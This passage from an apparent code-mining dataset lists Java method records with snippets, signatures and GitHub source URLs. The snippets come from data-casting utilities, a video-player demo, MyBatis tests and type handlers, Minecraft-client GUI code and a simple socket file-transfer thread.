["BytesColumn"], "throws": ["UnsupportedEncodingException"], "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String bytes2String(final BytesColumn column)            throws UnsupportedEncodingException {        return BytesCast.asString(column);    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/common/element/ColumnCast.java", "stars": "23", "class": {"name": "ColumnCast", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "init", "params": ["Configuration"], "throws": null, "modifiers": ["static"], "return_type": "void", "snippet": "    static void init(final Configuration configuration) {        StringCast.datetimeFormat = configuration.getString(                \"common.column.datetimeFormat\", StringCast.datetimeFormat);        StringCast.dateFormat = configuration.getString(                \"common.column.dateFormat\", StringCast.dateFormat);        StringCast.timeFormat = configuration.getString(                \"common.column.timeFormat\", StringCast.timeFormat);        StringCast.extraFormats = configuration.getList(                \"common.column.extraFormats\", Collections.<String>emptyList(), String.class);        StringCast.timeZone = configuration.getString(\"common.column.timeZone\",                StringCast.timeZone);        StringCast.timeZoner = TimeZone.getTimeZone(StringCast.timeZone);        StringCast.datetimeFormatter = FastDateFormat.getInstance(                StringCast.datetimeFormat, StringCast.timeZoner);        StringCast.dateFormatter = FastDateFormat.getInstance(                StringCast.dateFormat, StringCast.timeZoner);        StringCast.timeFormatter = FastDateFormat.getInstance(                StringCast.timeFormat, StringCast.timeZoner);        StringCast.encoding = configuration.getString(\"common.column.encoding\",                StringCast.encoding);    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/common/element/ColumnCast.java", "stars": "23", "class": {"name": "StringCast", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "asDate", "params": ["StringColumn"], "throws": ["ParseException"], "modifiers": ["static"], "return_type": "Date", "snippet": "    static Date asDate(final StringColumn column) throws ParseException {        if (null == column.asString()) {            return null;        }        try {            return StringCast.datetimeFormatter.parse(column.asString());        } catch (ParseException ignored) {        }        try {            return StringCast.dateFormatter.parse(column.asString());        } catch (ParseException ignored) {        }        ParseException e;        try {            return StringCast.timeFormatter.parse(column.asString());        } catch (ParseException ignored) {            e = ignored;        }        for (String format : StringCast.extraFormats) {            try {                return FastDateFormat.getInstance(format, StringCast.timeZoner).parse(column.asString());            } catch (ParseException ignored) {                e = ignored;            }        }        throw e;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/common/element/ColumnCast.java", "stars": "23", "class": {"name": "StringCast", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "asBytes", "params": ["StringColumn"], "throws": ["UnsupportedEncodingException"], "modifiers": ["static"], "return_type": "byte", "snippet": "    static byte[] asBytes(final StringColumn column)            throws UnsupportedEncodingException {        if (null == column.asString()) {            return null;        }        return column.asString().getBytes(StringCast.encoding);    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/common/element/ColumnCast.java", "stars": "23", "class": {"name": "StringCast", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "init", "params": ["Configuration"], "throws": null, "modifiers": ["static"], "return_type": "void", "snippet": "    static void init(final Configuration configuration) {        DateCast.datetimeFormat = configuration.getString(                \"common.column.datetimeFormat\", datetimeFormat);        DateCast.timeFormat = configuration.getString(                \"common.column.timeFormat\", timeFormat);        DateCast.dateFormat = configuration.getString(                \"common.column.dateFormat\", dateFormat);        DateCast.timeZone = configuration.getString(\"common.column.timeZone\",                DateCast.timeZone);        DateCast.timeZoner = TimeZone.getTimeZone(DateCast.timeZone);        return;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/common/element/ColumnCast.java", "stars": "23", "class": {"name": "DateCast", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "asString", "params": ["DateColumn"], "throws": null, "modifiers": ["static"], "return_type": "String", "snippet": "    static String asString(final DateColumn column) {        if (null == column.asDate()) {            return null;        }        switch (column.getSubType()) {            case DATE:                return DateFormatUtils.format(column.asDate(), DateCast.dateFormat,                        DateCast.timeZoner);            case TIME:                return DateFormatUtils.format(column.asDate(), DateCast.timeFormat,                        DateCast.timeZoner);            case DATETIME:                return DateFormatUtils.format(column.asDate(),                        DateCast.datetimeFormat, DateCast.timeZoner);            default:                throw DataXException                        .asDataXException(CommonErrorCode.CONVERT_NOT_SUPPORT,                                \"\u65f6\u95f4\u7c7b\u578b\u51fa\u73b0\u4e0d\u652f\u6301\u7c7b\u578b\uff0c\u76ee\u524d\u4ec5\u652f\u6301DATE/TIME/DATETIME\u3002\u8be5\u7c7b\u578b\u5c5e\u4e8e\u7f16\u7a0b\u9519\u8bef\uff0c\u8bf7\u53cd\u9988\u7ed9DataX\u5f00\u53d1\u56e2\u961f .\");        }    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/common/element/ColumnCast.java", "stars": "23", "class": {"name": "DateCast", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "init", "params": ["Configuration"], "throws": null, "modifiers": ["static"], "return_type": "void", "snippet": "    static void init(final Configuration configuration) {        BytesCast.encoding = configuration.getString(\"common.column.encoding\",                BytesCast.encoding);        return;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/common/element/ColumnCast.java", "stars": "23", "class": {"name": "BytesCast", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "asString", "params": ["BytesColumn"], "throws": ["UnsupportedEncodingException"], "modifiers": ["static"], "return_type": "String", "snippet": "    static String asString(final BytesColumn column)            throws UnsupportedEncodingException {        if (null == column.asBytes()) {            return null;        }        return new String(column.asBytes(), encoding);    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/common/element/ColumnCast.java", "stars": "23", "class": {"name": "BytesCast", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "onCreate", "params": ["Bundle"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        setContentView(R.layout.activity_deatil_list_player);        ButterKnife.bind(this);        //\u666e\u901a\u6a21\u5f0f        initVideo();        //String url = \"http://baobab.wd jcdn.com/14564977406580.mp4\";        List<GSYVideoModel> urls = new ArrayList<>();        urls.add(new GSYVideoModel(\"http://7xjmzj.com1.z0.glb.clouddn.com/20171026175005_JObCxCE2.mp4\", \"\u6807\u98981\"));        urls.add(new GSYVideoModel(\"http://9890.vod.myqcloud.com/9890_4e292f9a3dd011e6b4078980237cc3d3.f20.mp4\", \"\u6807\u98982\"));        urls.add(new GSYVideoModel(\"https://res.exexm.com/cw_145225549855002\", \"\u6807\u98983\"));        urls.add(new GSYVideoModel(\"http://9890.vod.myqcloud.com/9890_4e292f9a3dd011e6b4078980237cc3d3.f20.mp4\", \"\u6807\u98984\"));        detailPlayer.setUp(urls, true, 0);        //\u589e\u52a0\u5c01\u9762        ImageView imageView = new ImageView(this);        imageView.setScaleType(ImageView.ScaleType.CENTER_CROP);        imageView.setImageResource(R.mipmap.xxx1);        detailPlayer.setThumbImageView(imageView);        resolveNormalVideoUI();        detailPlayer.setIsTouchWiget(true);        //\u5173\u95ed\u81ea\u52a8\u65cb\u8f6c        detailPlayer.setRotateViewAuto(false);        detailPlayer.setLockLand(false);        detailPlayer.setShowFullAnimation(false);        //detailPlayer.setNeedLockFull(true);        detailPlayer.setAutoFullWithSize(true);        detailPlayer.setVideoAllCallBack(this);        detailPlayer.setLockClickListener(new LockClickListener() {            @Override            public void onClick(View view, boolean lock) {                if (orientationUtils != null) {                    //\u914d\u5408\u4e0b\u65b9\u7684onConfigurationChanged                    orientationUtils.setEnable(!lock);                }            }        });        next.setOnClickListener(new View.OnClickListener() {            @Override            public void onClick(View v) {                ((ListGSYVideoPlayer) detailPlayer.getCurrentPlayer()).playNext();            }        });    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/DetailListPlayer.java", "stars": "2", "class": {"name": "DetailListPlayer", "extends": "GSYBaseActivityDetail", "implements": null, "modifiers": ["public"]}}, {"method_name": "getGSYVideoPlayer", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ListGSYVideoPlayer", "snippet": "    public ListGSYVideoPlayer getGSYVideoPlayer() {        return detailPlayer;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/DetailListPlayer.java", "stars": "2", "class": {"name": "DetailListPlayer", "extends": "GSYBaseActivityDetail", "implements": null, "modifiers": ["public"]}}, {"method_name": "getGSYVideoOptionBuilder", "params": [], "throws": null, "modifiers": ["public"], "return_type": "GSYVideoOptionBuilder", "snippet": "    public GSYVideoOptionBuilder getGSYVideoOptionBuilder() {        //\u4e0d\u9700\u8981builder\u7684        return null;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/DetailListPlayer.java", "stars": "2", "class": {"name": "DetailListPlayer", "extends": "GSYBaseActivityDetail", "implements": null, "modifiers": ["public"]}}, {"method_name": "clickForFullScreen", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void clickForFullScreen() {    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/DetailListPlayer.java", "stars": "2", "class": {"name": "DetailListPlayer", "extends": "GSYBaseActivityDetail", "implements": null, "modifiers": ["public"]}}, {"method_name": "getDetailOrientationRotateAuto", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean getDetailOrientationRotateAuto() {        return true;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/DetailListPlayer.java", "stars": "2", "class": {"name": "DetailListPlayer", "extends": "GSYBaseActivityDetail", "implements": null, "modifiers": ["public"]}}, {"method_name": "onEnterFullscreen", "params": ["String", "Object"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onEnterFullscreen(String url, Object... objects) {        super.onEnterFullscreen(url, objects);        //\u9690\u85cf\u8c03\u5168\u5c4f\u5bf9\u8c61\u7684\u8fd4\u56de\u6309\u952e        GSYVideoPlayer gsyVideoPlayer = (GSYVideoPlayer) objects[1];        gsyVideoPlayer.getBackButton().setVisibility(View.GONE);    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/DetailListPlayer.java", "stars": "2", "class": {"name": "DetailListPlayer", "extends": "GSYBaseActivityDetail", "implements": null, "modifiers": ["public"]}}, {"method_name": "resolveNormalVideoUI", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void resolveNormalVideoUI() {        //\u589e\u52a0title        detailPlayer.getTitleTextView().setVisibility(View.VISIBLE);        detailPlayer.getBackButton().setVisibility(View.VISIBLE);    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/DetailListPlayer.java", "stars": "2", "class": {"name": "DetailListPlayer", "extends": "GSYBaseActivityDetail", "implements": null, "modifiers": ["public"]}}, {"method_name": "getCurPlay", "params": [], "throws": null, "modifiers": ["private"], "return_type": "GSYVideoPlayer", "snippet": "    private GSYVideoPlayer getCurPlay() {        if (detailPlayer.getFullWindowPlayer() != null) {            return detailPlayer.getFullWindowPlayer();        }        return detailPlayer;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/DetailListPlayer.java", "stars": "2", "class": {"name": "DetailListPlayer", "extends": "GSYBaseActivityDetail", "implements": null, "modifiers": ["public"]}}, {"method_name": "setUp", "params": [], "throws": ["Exception"], "modifiers": ["static"], "return_type": "void", "snippet": "  static void setUp() throws Exception {    try (Reader reader = Resources.getResourceAsReader(\"org/apache/ibatis/submitted/nested/MapperConfig.xml\")) {      sqlSessionFactory = new SqlSessionFactoryBuilder().build(reader);    }    BaseDataTest.runScript(sqlSessionFactory.getConfiguration().getEnvironment().getDataSource(),            \"org/apache/ibatis/submitted/nested/CreateDB.sql\");  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/nested/NestedForEachTest.java", "stars": "15", "class": {"name": "NestedForEachTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testSimpleSelect", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void testSimpleSelect() {    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {      Name name = new Name();      name.setLastName(\"Flintstone\");      Parameter parameter = new Parameter();      parameter.addName(name);      List<Map<String, Object>> answer =          sqlSession.selectList(\"org.apache.ibatis.submitted.nested.Mapper.simpleSelect\", parameter);      assertEquals(3, answer.size());    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/nested/NestedForEachTest.java", "stars": "15", "class": {"name": "NestedForEachTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testSimpleSelectWithPrimitives", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void testSimpleSelectWithPrimitives() {    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {      Map<String, Object> parameter = new HashMap<>();      int[] array = new int[] {1, 3, 5};      parameter.put(\"ids\", array);      List<Map<String, Object>> answer =          sqlSession.selectList(\"org.apache.ibatis.submitted.nested.Mapper.simpleSelectWithPrimitives\", parameter);      assertEquals(3, answer.size());    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/nested/NestedForEachTest.java", "stars": "15", "class": {"name": "NestedForEachTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testSimpleSelectWithMapperAndPrimitives", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void testSimpleSelectWithMapperAndPrimitives() {    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {      Mapper mapper = sqlSession.getMapper(Mapper.class);      List<Map<String, Object>> answer = mapper.simpleSelectWithMapperAndPrimitives(1, 3, 5);      assertEquals(3, answer.size());    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/nested/NestedForEachTest.java", "stars": "15", "class": {"name": "NestedForEachTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testNestedSelect", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void testNestedSelect() {    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {      Name name = new Name();      name.setLastName(\"Flintstone\");      name.addFirstName(\"Fred\");      name.addFirstName(\"Wilma\");      Parameter parameter = new Parameter();      parameter.addName(name);      List<Map<String, Object>> answer =          sqlSession.selectList(\"org.apache.ibatis.submitted.nested.Mapper.nestedSelect\", parameter);      assertEquals(2, answer.size());    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/nested/NestedForEachTest.java", "stars": "15", "class": {"name": "NestedForEachTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testNestedSelect2", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void testNestedSelect2() {    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {      Name name = new Name();      name.setLastName(\"Flintstone\");      name.addFirstName(\"Fred\");      name.addFirstName(\"Wilma\");      Parameter parameter = new Parameter();      parameter.addName(name);      name = new Name();      name.setLastName(\"Rubble\");      name.addFirstName(\"Betty\");      parameter.addName(name);      List<Map<String, Object>> answer =          sqlSession.selectList(\"org.apache.ibatis.submitted.nested.Mapper.nestedSelect\", parameter);      assertEquals(3, answer.size());    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/nested/NestedForEachTest.java", "stars": "15", "class": {"name": "NestedForEachTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "getName", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getName() {        return name;    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/adapters/models/Option.java", "stars": "4", "class": {"name": "Option", "extends": null, "implements": ["Comparable"], "modifiers": ["public"]}}, {"method_name": "getData", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getData() {        return data;    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/adapters/models/Option.java", "stars": "4", "class": {"name": "Option", "extends": null, "implements": ["Comparable"], "modifiers": ["public"]}}, {"method_name": "getPath", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getPath() {        return path;    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/adapters/models/Option.java", "stars": "4", "class": {"name": "Option", "extends": null, "implements": ["Comparable"], "modifiers": ["public"]}}, {"method_name": "equals", "params": ["Object"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean equals(Object o) {        if (this == o) return true;        if (o == null || getClass() != o.getClass()) return false;        Option option = (Option) o;        return name != null ? name.equals(option.name) : option.name == null                && (data != null ? data.equals(option.data) : option.data == null                && (path != null ? path.equals(option.path) : option.path == null));    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/adapters/models/Option.java", "stars": "4", "class": {"name": "Option", "extends": null, "implements": ["Comparable"], "modifiers": ["public"]}}, {"method_name": "hashCode", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int hashCode() {        int result = name != null ? name.hashCode() : 0;        result = 31 * result + (data != null ? data.hashCode() : 0);        result = 31 * result + (path != null ? path.hashCode() : 0);        return result;    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/adapters/models/Option.java", "stars": "4", "class": {"name": "Option", "extends": null, "implements": ["Comparable"], "modifiers": ["public"]}}, {"method_name": "compareTo", "params": ["Option"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int compareTo(@NonNull Option o) {        if (this.name != null)            return this.name.toLowerCase(LocaleUtils.getCurrent()).compareTo(o.getName().toLowerCase(LocaleUtils.getCurrent()));        else            throw new IllegalArgumentException();    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/adapters/models/Option.java", "stars": "4", "class": {"name": "Option", "extends": null, "implements": ["Comparable"], "modifiers": ["public"]}}, {"method_name": "setNonNullParameter", "params": ["PreparedStatement", "int", "HashMap<String,String>", "JdbcType"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void setNonNullParameter(PreparedStatement ps, int i, HashMap<String, String> parameter, JdbcType jdbcType)      throws SQLException {    ps.setString(i, parameter.get(\"name\"));  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/hashmaptypehandler/HashMapTypeHandler.java", "stars": "15", "class": {"name": "HashMapTypeHandler", "extends": "BaseTypeHandler", "implements": null, "modifiers": ["public"]}}, {"method_name": "getNullableResult", "params": ["ResultSet", "String"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "HashMap<String,String>", "snippet": "  public HashMap<String, String> getNullableResult(ResultSet rs, String columnName) throws SQLException {    return null;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/hashmaptypehandler/HashMapTypeHandler.java", "stars": "15", "class": {"name": "HashMapTypeHandler", "extends": "BaseTypeHandler", "implements": null, "modifiers": ["public"]}}, {"method_name": "getNullableResult", "params": ["ResultSet", "int"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "HashMap<String,String>", "snippet": "  public HashMap<String, String> getNullableResult(ResultSet rs, int columnIndex) throws SQLException {    return null;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/hashmaptypehandler/HashMapTypeHandler.java", "stars": "15", "class": {"name": "HashMapTypeHandler", "extends": "BaseTypeHandler", "implements": null, "modifiers": ["public"]}}, {"method_name": "getNullableResult", "params": ["CallableStatement", "int"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "HashMap<String,String>", "snippet": "  public HashMap<String, String> getNullableResult(CallableStatement cs, int columnIndex) throws SQLException {    return null;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/hashmaptypehandler/HashMapTypeHandler.java", "stars": "15", "class": {"name": "HashMapTypeHandler", "extends": "BaseTypeHandler", "implements": null, "modifiers": ["public"]}}, {"method_name": "init", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void init() {        float offsetY = getH() - 2f;        for (Module iModule : Mercury.INSTANCE.getModuleManager().getModsInCategory(moduleCategory)) {            if (!iModule.isPersistent()) {                getComponents().add(new ModuleComponent(iModule, getX(), getY(), 2, offsetY, getW() - 4, 15));                offsetY += 15;            }        }        super.init();    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/gui/click/panel/panels/modules/frame/impl/CategoryFrame.java", "stars": "12", "class": {"name": "CategoryFrame", "extends": "Frame", "implements": null, "modifiers": ["public"]}}, {"method_name": "moved", "params": ["float", "float"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void moved(float x, float y) {        super.moved(x, y);    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/gui/click/panel/panels/modules/frame/impl/CategoryFrame.java", "stars": "12", "class": {"name": "CategoryFrame", "extends": "Frame", "implements": null, "modifiers": ["public"]}}, {"method_name": "drawScreen", "params": ["int", "int", "float"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void drawScreen(int x, int y, float partialTicks) {        /*RenderUtil.drawRect2(getX(), getY(), getW(), getH() + (isExtended() ? getHeight() : 0), 0xff050505);        RenderUtil.drawBorderedRect2(getX() + .5f, getY() + .5f, getW() - 1f, getH() - 1f + (isExtended() ? getHeight() : 0), 0.5f, 0xff282828, 0xff282828);        RenderUtil.drawBorderedRect2(getX() + 1.5f, getY() + 1.5f, getW() - 3f, getH() - 3f + (isExtended() ? getHeight() : 0), 0.5f, 0xff111111, 0xff3C3C3C);        for (float i = 2.5f; i < getW() - 2.5f; i++) {            int color = Color.getHSBColor(i / 115, 0.9f, 1).getRGB();            RenderUtil.drawRect2(getX() + i, getY() + 2.5f, 1, 0.5f, color);        }*/        RenderUtil.drawRect2(getX() - 1, getY() - 2, getW() + 3, getH(), new Color(45, 45, 45).getRGB());        Menu.font.drawStringWithShadow(getLabel(), getX() + getW() / 2 - Menu.font.getStringWidth(getLabel()) / 2, (getY() - 2) + getH() / 2 - Menu.font.getHeight() / 2, -1);        super.drawScreen(x, y, partialTicks);        if (isExtended())            resetHeights();    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/gui/click/panel/panels/modules/frame/impl/CategoryFrame.java", "stars": "12", "class": {"name": "CategoryFrame", "extends": "Frame", "implements": null, "modifiers": ["public"]}}, {"method_name": "mouseClicked", "params": ["int", "int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void mouseClicked(int x, int y, int button) {        super.mouseClicked(x, y, button);    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/gui/click/panel/panels/modules/frame/impl/CategoryFrame.java", "stars": "12", "class": {"name": "CategoryFrame", "extends": "Frame", "implements": null, "modifiers": ["public"]}}, {"method_name": "mouseReleased", "params": ["int", "int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void mouseReleased(int x, int y, int button) {        super.mouseReleased(x, y, button);    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/gui/click/panel/panels/modules/frame/impl/CategoryFrame.java", "stars": "12", "class": {"name": "CategoryFrame", "extends": "Frame", "implements": null, "modifiers": ["public"]}}, {"method_name": "keyTyped", "params": ["char", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void keyTyped(char character, int key) {        super.keyTyped(character, key);    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/gui/click/panel/panels/modules/frame/impl/CategoryFrame.java", "stars": "12", "class": {"name": "CategoryFrame", "extends": "Frame", "implements": null, "modifiers": ["public"]}}, {"method_name": "resetHeights", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void resetHeights() {        float offsetY = getH() - 2f;        for (Component component : getComponents()) {            component.setOffsety(offsetY);            component.moved(getX(),getY());            if (component instanceof  ModuleComponent) {                if (((ModuleComponent) component).isExtended()) {                    for (Component component1 : component.getSubComponents()) {                        offsetY += component1.getH();                    }                }            }            offsetY += component.getH();        }    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/gui/click/panel/panels/modules/frame/impl/CategoryFrame.java", "stars": "12", "class": {"name": "CategoryFrame", "extends": "Frame", "implements": null, "modifiers": ["public"]}}, {"method_name": "getHeight", "params": [], "throws": null, "modifiers": ["private"], "return_type": "float", "snippet": "    private float getHeight() {        float offsetY = 0;        for (Component component : getComponents()) {            if (component instanceof  ModuleComponent) {                if (((ModuleComponent) component).isExtended()) {                    for (Component component1 : component.getSubComponents()) {                        offsetY += component1.getH();                    }                }            }            offsetY += component.getH();        }        return offsetY;    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/gui/click/panel/panels/modules/frame/impl/CategoryFrame.java", "stars": "12", "class": {"name": "CategoryFrame", "extends": "Frame", "implements": null, "modifiers": ["public"]}}, {"method_name": "OnDataRetrieved", "params": ["T"], "throws": null, "modifiers": ["public", "abstract"], "return_type": "void", "snippet": "    public abstract void OnDataRetrieved(T t);}", "url": "https://raw.githubusercontent.com/islammohsen/FirebaseDao/master/firbasedao/src/main/java/com/example/firbasedao/Listeners/RetrievalEventListener.java", "stars": "2", "class": {"name": "RetrievalEventListener", "extends": "AbstractEventListener", "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "run", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void run()    {        try        {            reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));                        out = new BufferedOutputStream(socket.getOutputStream());                        //System.out.println(\"Enter the fie\");            String fileName = reader.readLine();            System.out.println(\"File Name is \" + fileName + \"has requested by\" +                     socket.getInetAddress().getHostAddress());                        File file = new File(fileName);            if(!file.exists())            {                byte code = (byte)0;                out.write(code);                closeConnection();            }            else            {                //bytes can only represent -127 to 127                 byte code = (byte)1;                out.write(code);                                fileReader = new BufferedInputStream(new FileInputStream(file));                                byte[] buffer = new byte[1024];                int bytesRead = 0;                while((bytesRead = fileReader.read(buffer)) != -1 )                {                   out.write(buffer, 0, bytesRead);                   out.flush();                   closeConnection();                }                }                        }catch(Exception e)        {               System.out.println(e.toString());            }    }", "url": "https://raw.githubusercontent.com/itarunbisht/ReadMeTransfer/master/ClientThread.java", "stars": "1", "class": {"name": "ClientThread", "extends": "Thread", "implements": null, "modifiers": ["public"]}}, {"method_name": "closeConnection", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void closeConnection()    {        try        {            if(out!=null)            {                   out.close();            }                        if(reader!=null)            {                   reader.close();            }            if(fileReader!=null)            {                fileReader.close();            }            if(out!=null)            {                   socket.close();            }        }        catch(Exception e)        {            System.out.println(e.toString());        }    }", "url": "https://raw.githubusercontent.com/itarunbisht/ReadMeTransfer/master/ClientThread.java", "stars": "1", "class": {"name": "ClientThread", "extends": "Thread", "implements": null, "modifiers": ["public"]}}, {"method_name": "setNonNullParameter", "params": ["PreparedStatement", "int", "Object", "JdbcType"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void setNonNullParameter(PreparedStatement ps, int i, Object parameter, JdbcType jdbcType)      throws SQLException {    ps.setObject(i, parameter);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/ObjectTypeHandler.java", "stars": "15", "class": {"name": "ObjectTypeHandler", "extends": "BaseTypeHandler", "implements": null, "modifiers": ["public"]}}, {"method_name": "getNullableResult", "params": ["ResultSet", "String"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "Object", "snippet": "  public Object getNullableResult(ResultSet rs, String columnName)      throws SQLException {    return rs.getObject(columnName);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/ObjectTypeHandler.java", "stars": "15", "class": {"name": "ObjectTypeHandler", "extends": "BaseTypeHandler", "implements": null, "modifiers": ["public"]}}, {"method_name": "getNullableResult", "params": ["ResultSet", "int"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "Object", "snippet": "  public Object getNullableResult(ResultSet rs, int columnIndex)      throws SQLException {    return rs.getObject(columnIndex);  }", "url": 